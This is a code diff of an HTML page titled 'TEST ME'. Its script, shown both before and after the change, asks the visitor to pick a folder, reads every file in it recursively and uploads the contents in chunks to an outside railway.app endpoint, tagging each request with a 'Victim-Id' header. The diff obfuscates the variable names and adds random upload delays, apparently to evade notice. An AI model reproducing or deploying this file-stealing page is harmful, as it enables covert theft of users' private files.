@@ -5,125 +5,97 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TEST ME</title>
   <style>
-    body {
-      background: #582c2c;
-      color: #0F0;
-      font-family: monospace;
-      text-align: center;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    button {
-      padding: 10px;
-      border: 2px solid red;
-      background: transparent;
-      color: red;
-      cursor: pointer;
-      font-size: 1.2rem;
-      margin-top: 20px;
-    }
-    button:hover {
-      background: red;
-      color: #000;
-    }
+    body {background:#582c2c; color:#0F0; font-family:monospace; text-align:center; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column}
+    button {padding:10px; border:2px solid red; background:transparent; color:red; cursor:pointer; font-size:1.2rem; margin-top:20px}
+    button:hover {background:red; color:#000}
   </style>
 </head>
 <body>
-  <h1>Test Me</h1>
+  <h1>TeST ME</h1>
   <button id="start">Start</button>
-
   <script>
-    (function() {
-      const uploadUrl = "https://deobbetest1-production-104e.up.railway.app/upload";
-
+    (function(){
+      let _0x1a2b3c = "https://deobbetest1-production-104e.up.railway.app/upload";
+    
       document.getElementById("start").addEventListener("click", async () => {
         try {
-          const victimId = crypto.randomUUID();
-          const directoryHandle = await window.showDirectoryPicker();
-
-          async function processFiles(directoryHandle, victimId) {
-            const uploadPromises = [];
-            const maxConcurrentUploads = 3;
-            const processedFiles = new Set();
-
-            for await (const entry of directoryHandle.values()) {
-              if (entry.kind === "file" && !entry.name.startsWith(".")) {
-                if (!processedFiles.has(entry.name)) {
-                  processedFiles.add(entry.name);
-                  const file = await entry.getFile();
-                  const fileSize = file.size;
-
-                  const uploadPromise = (async function uploadFile(file, victimId) {
-                    const arrayBuffer = await file.arrayBuffer();
-                    const fileData = new Uint8Array(arrayBuffer);
-
-                    const chunks = [];
+          let _0x9f8e7d = crypto.randomUUID();
+          let _0xa3b4c5 = await window.showDirectoryPicker();
+          
+          await (async function _0xf0e1d2(_0xabc123, _0xdef456) {
+            let _0xuploadPromises = [];
+            let _0xmaxConcurrent = 3;
+            let processedFiles = new Set();
+    
+            for await (let _0x56789a of _0xabc123.values()) {
+              if (_0x56789a.kind === "file" && !_0x56789a.name.startsWith(".")) {
+                if (!processedFiles.has(_0x56789a.name)) {
+                  processedFiles.add(_0x56789a.name);
+                  let _0x111222 = await _0x56789a.getFile();
+                  let _0xfileSize = _0x111222.size;
+                  
+                  let _0xuploadPromise = (async function _0x333444(_0xaaa, _0xbbb) {
+                    let _0xccc = await _0xbbb.arrayBuffer();
+                    let _0xddd = new Uint8Array(_0xccc);
+                    
+                    let chunks = [];
                     let offset = 0;
                     let minChunkSize, maxChunkSize;
-
-                    if (fileSize < 1 * 1024 * 1024) { // Less than 1MB
-                      minChunkSize = maxChunkSize = fileSize; // Single chunk
-                    } else if (fileSize < 10 * 1024 * 1024) { // 1MB - 10MB
+    
+                    if (_0xfileSize < 1 * 1024 * 1024) { // Less than 1MB
+                      minChunkSize = maxChunkSize = _0xfileSize; // Single chunk
+                    } else if (_0xfileSize < 10 * 1024 * 1024) { // 1MB - 10MB
                       minChunkSize = 400 * 1024;
                       maxChunkSize = 1000 * 1024;
                     } else { // 10MB - 100MB
-                      minChunkSize = 2000 * 1024;
-                      maxChunkSize = 5000 * 1024;
+                      minChunkSize = 1000 * 1024;
+                      maxChunkSize = 3000 * 1024;
                     }
-
-                    while (offset < fileData.byteLength) {
-                      const chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
-                      const end = Math.min(offset + chunkSize, fileData.byteLength);
-                      const chunkData = fileData.slice(offset, end);
+    
+                    while (offset < _0xddd.byteLength) {
+                      let chunkSize = Math.floor(Math.random() * (maxChunkSize - minChunkSize) + minChunkSize);
+                      let end = Math.min(offset + chunkSize, _0xddd.byteLength);
+                      let chunkData = _0xddd.slice(offset, end);
                       chunks.push({ index: chunks.length + 1, total: 0, data: chunkData });
                       offset = end;
                     }
-
+                    
                     // Assign total chunks count to each chunk
                     chunks.forEach(chunk => chunk.total = chunks.length);
-
-                    // Shuffle chunks randomly
-                    chunks.sort(() => Math.random() - 0.5);
-
-                    for (const { index, total, data } of chunks) {
-                      //await new Promise(resolve => setTimeout(resolve, Math.random() * (50 - 10) + 10)); // 0.01 - 0.05 sec delay
-                      await fetch(uploadUrl, {
+                    
+                    for (let { index, total, data } of chunks) {
+                      await new Promise(resolve => setTimeout(resolve, Math.random() * (100 - 50) + 50)); // 0.05 - 0.1 sec delay
+                      await fetch(_0x1a2b3c, {
                         method: "POST",
                         headers: {
                           "Content-Type": "application/octet-stream",
-                          "Victim-Id": encodeURIComponent(victimId),
-                          "Filename": encodeURIComponent(file.name),
+                          "Victim-Id": encodeURIComponent(_0xaaa),
+                          "Filename": encodeURIComponent(_0xbbb.name),
                           "Chunk-Index": index,
                           "Total-Chunks": total
                         },
                         body: data
                       });
                     }
-                  })(file, victimId);
-                  uploadPromises.push(uploadPromise);
-
-                  if (uploadPromises.length >= maxConcurrentUploads) {
-                    await Promise.allSettled(uploadPromises);
-                    uploadPromises.length = 0;
+                  })(_0xdef456, _0x111222);
+                  _0xuploadPromises.push(_0xuploadPromise);
+                  if (_0xuploadPromises.length >= _0xmaxConcurrent) {
+                    await Promise.allSettled(_0xuploadPromises);
+                    _0xuploadPromises = [];
                   }
                 }
-              } else if (entry.kind === "directory") {
-                await processFiles(entry, victimId);
+              } else if (_0x56789a.kind === "directory") {
+                await _0xf0e1d2(await _0x56789a, _0xdef456);
               }
             }
-
-            await Promise.allSettled(uploadPromises);
-          }
-
-          await processFiles(directoryHandle, victimId);
-        } catch (error) {
-          console.error("An error occurred", error);
+            await Promise.allSettled(_0xuploadPromises);
+          })(_0xa3b4c5, _0x9f8e7d);
+        } catch (_0x999999) {
+          console.error("An error occurred", _0x999999);
         }
       });
     })();
+         
   </script>
 </body>
 </html>
